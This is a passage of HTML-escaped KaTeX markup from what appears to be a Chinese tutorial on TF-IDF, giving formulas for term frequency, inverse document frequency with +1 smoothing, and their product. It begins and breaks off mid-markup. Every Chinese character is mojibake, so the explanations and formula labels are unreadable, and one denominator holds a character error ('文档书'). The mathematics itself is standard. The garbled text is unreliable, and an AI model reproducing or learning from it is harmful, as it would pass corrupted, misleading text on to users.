&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;åœ¨&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸€&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ç±»&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸­&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å‡º&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ç°&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¬¡&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯¥&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ç±»&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸­&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ‰€&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æœ‰&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ç›®&lt;/mi&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;TF_w = \frac{åœ¨ä¸€ç±»ä¸­è¯æ¡wå‡ºç°çš„æ¬¡æ•°}{è¯¥ç±»ä¸­æ‰€æœ‰çš„è¯æ¡æ•°ç›®}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.7935600000000003em;vertical-align:-0.686em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.10756em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯¥&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ç±»&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸­&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ‰€&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æœ‰&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ç›®&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;åœ¨&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸€&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ç±»&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸­&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å‡º&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ç°&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¬¡&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.686em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;idfinverse-document-frequency&#34;&gt;IDF(Inverse Document Frequency)&lt;/h3&gt;
&lt;p&gt;é€†å‘æ–‡ä»¶é¢‘ç‡(IDF)ï¼šæŸä¸€ç‰¹å®šè¯è¯­çš„IDFï¼Œå¯ä»¥ç”±æ€»æ–‡ä»¶æ•°ç›®é™¤ä»¥åŒ…å«è¯¥è¯è¯­çš„æ–‡ä»¶çš„æ•°ç›®ï¼Œå†å°†å¾—åˆ°çš„å•†å–å¯¹æ•°å¾—åˆ°ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœåŒ…å«è¯æ¡tçš„æ–‡æ¡£è¶Šå°‘, IDFè¶Šå¤§ï¼Œåˆ™è¯´æ˜è¯æ¡å…·æœ‰å¾ˆå¥½çš„ç±»åˆ«åŒºåˆ†èƒ½åŠ›ã€‚&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯­&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ–™&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;åº“&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ–‡&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡£&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ€»&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;åŒ…&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å«&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ–‡&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡£&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¹¦&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;IDF_w = log(\frac{è¯­æ–™åº“çš„æ–‡æ¡£æ€»æ•°}{åŒ…å«è¯æ¡wçš„æ–‡æ¡£ä¹¦+1})
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.51933em;vertical-align:-0.7693300000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.677em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;åŒ…&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å«&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ–‡&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡£&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¹¦&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯­&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ–™&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;åº“&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ–‡&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡£&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ€»&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7693300000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;+1æ˜¯ä¸ºäº†é¿å…åˆ†æ¯ä¸º0ã€‚&lt;/p&gt;
&lt;h3 id=&#34;tf-idf-2&#34;&gt;TF-IDF&lt;/h3&gt;
&lt;p&gt;æŸä¸€ç‰¹å®šæ–‡ä»¶å†…çš„é«˜è¯è¯­é¢‘ç‡ï¼Œä»¥åŠè¯¥è¯è¯­åœ¨æ•´ä¸ªæ–‡ä»¶é›†åˆä¸­çš„ä½æ–‡ä»¶é¢‘ç‡ï¼Œå¯ä»¥äº§ç”Ÿå‡ºé«˜æƒé‡çš„TF-IDFã€‚å› æ­¤ï¼ŒTF-IDFå€¾å‘äºè¿‡æ»¤æ‰å¸¸è§çš„è¯è¯­ï¼Œä¿ç•™é‡è¦çš„è¯è¯­ã€‚&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;é‡&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å•&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ€»&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ–‡&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡£&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ€»&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;åŒ…&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å«&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;è¯&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ–‡&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ¡£&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;TF-IDF = TF * IDF = \frac{è¯æ¡wæ•°é‡}{å•è¯æ€»æ•°}*log(\frac{æ–‡æ¡£æ€»æ•°}{åŒ…å«wè¯æ¡çš„æ–‡æ¡£æ•°+1})
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.76666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.7935600000000003em;vertical-align:-0.686em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.10756em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å•&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ€»&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;é‡&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.686em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.51933em;vertical-align:-0.7693300000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.677em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;åŒ…&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å«&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;è¯&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡&lt;/span&gt;&lt;span class=&#34;mord 